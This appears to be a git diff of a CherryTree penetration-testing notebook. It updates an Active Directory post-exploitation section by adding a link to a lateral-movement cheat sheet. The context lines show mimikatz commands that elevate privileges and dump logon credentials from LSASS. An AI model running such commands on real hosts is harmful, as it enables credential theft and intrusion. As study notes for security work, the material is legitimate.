@@ -624,7 +624,7 @@ Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Full
     </node>
     <node name="AD" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1569561597" ts_lastsave="1689416622">
       <rich_text>Here it will be AD</rich_text>
-      <node name="Post-Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569563672" ts_lastsave="1690114547">
+      <node name="Post-Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569563672" ts_lastsave="1690115883">
         <rich_text>We will use </rich_text>
         <rich_text weight="heavy">mimikatz</rich_text>
         <rich_text>:
@@ -664,7 +664,10 @@ Make sure to check every </rich_text>
 
 Make sure to check the </rich_text>
         <rich_text weight="heavy">default password</rich_text>
-        <rich_text>.</rich_text>
+        <rich_text>.
+
+Also check this link: </rich_text>
+        <rich_text link="webs https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1">https://pentest.coffee/active-directory-lateral-movement-and-post-exploitation-cheat-sheet-3170982a7055#4fb1</rich_text>
         <codebox char_offset="22" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">privilege::debug # this will allow us to temper with LSASS
 token::elevate # this will make us nt_authority</codebox>
         <codebox char_offset="81" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sekurlsa::logonpasswords
